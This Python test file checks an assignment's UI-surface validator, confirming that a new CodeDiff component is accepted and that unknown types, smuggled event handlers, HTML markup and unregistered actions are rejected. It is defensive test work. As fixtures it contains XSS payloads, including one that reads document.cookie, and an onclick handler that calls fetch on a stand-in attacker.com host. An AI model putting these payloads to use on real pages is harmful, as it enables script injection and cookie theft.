"""Tests for Session 14 Assignment: Catalog Extension (CodeDiff), 3 Invariants, and UI App Composition."""

from __future__ import annotations

import pytest

from s13code.ui.catalog import COMPONENTS, REGISTERED_ACTIONS, catalog_manifest
from s13code.ui.validator import Invariant, validate_surface


def test_codediff_component_in_catalog():
    """Part 1: CodeDiff component is registered in trusted catalog with typed props."""
    assert "CodeDiff" in COMPONENTS
    spec = COMPONENTS["CodeDiff"]
    assert spec.type == "CodeDiff"
    assert spec.source == "custom"
    assert "title" in spec.props
    assert "oldCode" in spec.props
    assert "newCode" in spec.props
    assert "language" in spec.props
    assert spec.props["oldCode"].kind == "binding"
    assert spec.props["newCode"].kind == "binding"

    manifest = catalog_manifest()
    assert "CodeDiff" in manifest["components"]
    assert manifest["components"]["CodeDiff"]["source"] == "custom"


def test_valid_codediff_surface():
    """Valid CodeDiff surface passes validator cleanly."""
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["c1"]},
            {
                "id": "c1",
                "type": "CodeDiff",
                "title": "IIT JEE Formula Solution",
                "oldCode": {"$bind": "/old_solution"},
                "newCode": {"$bind": "/new_solution"},
                "language": "python",
            },
        ],
        "dataModel": {
            "old_solution": "v = u + a*t",
            "new_solution": "v = u + a*t\ns = u*t + 0.5*a*t^2",
        },
    }
    res = validate_surface(surface)
    assert res.ok
    assert len(res.accepted) == 2
    assert len(res.rejections) == 0


def test_invariant_1_catalog_rejects_unknown_type():
    """Catalog Invariant: Unknown component type (RawHtml) is rejected."""
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["bad1"]},
            {"id": "bad1", "type": "RawHtml", "content": "<script>alert(1)</script>"},
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    assert len(res.rejections) == 1
    rej = res.rejections[0]
    assert rej.component_id == "bad1"
    assert rej.invariant == Invariant.CATALOG
    assert "unknown component type" in rej.reason


def test_invariant_2_data_not_code_rejects_handler_and_markup():
    """Data-not-code Invariant: Smuggled event handlers and HTML markup in text are rejected."""
    # Test A: Smuggled onclick handler property
    surface_handler = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["b1"]},
            {"id": "b1", "type": "Button", "label": "Click", "onclick": "fetch('http://attacker.com')"},
        ],
    }
    res_handler = validate_surface(surface_handler)
    assert not res_handler.ok
    rej1 = res_handler.rejections[0]
    assert rej1.invariant == Invariant.DATA_NOT_CODE
    assert "event-handler property" in rej1.reason

    # Test B: Text property containing executable HTML markup
    surface_markup = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["t1"]},
            {"id": "t1", "type": "Text", "variant": "heading", "text": "<img src=x onerror=alert(document.cookie)>"},
        ],
    }
    res_markup = validate_surface(surface_markup)
    assert not res_markup.ok
    rej2 = res_markup.rejections[0]
    assert rej2.invariant == Invariant.DATA_NOT_CODE
    assert "value carries markup" in rej2.reason


def test_invariant_3_event_rejects_unregistered_action():
    """Event Invariant: UI button referencing unregistered action is rejected."""
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["b1"]},
            {
                "id": "b1",
                "type": "Button",
                "label": "Execute Bad Action",
                "onPress": {"action": "steal_memory_handle", "args": {}},
            },
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    assert len(res.rejections) == 1
    rej = res.rejections[0]
    assert rej.invariant == Invariant.EVENT
    assert "unregistered action" in rej.reason


def test_partial_rejection_allows_safe_components_to_render():
    """Single poisoned node is rejected while safe parts still validate and render."""
    surface = {
        "root": "c0",
        "components": [
            {"id": "c0", "type": "Column", "children": ["safe1", "poison", "safe2"]},
            {"id": "safe1", "type": "Text", "text": {"$bind": "/title"}},
            {"id": "poison", "type": "RawHtml", "code": "system.exit()"},
            {"id": "safe2", "type": "Button", "label": "Continue", "onPress": {"action": "request_data"}},
        ],
    }
    res = validate_surface(surface)
    assert not res.ok
    accepted_ids = {c["id"] for c in res.accepted}
    assert accepted_ids == {"c0", "safe1", "safe2"}
    assert len(res.rejections) == 1
    assert res.rejections[0].component_id == "poison"
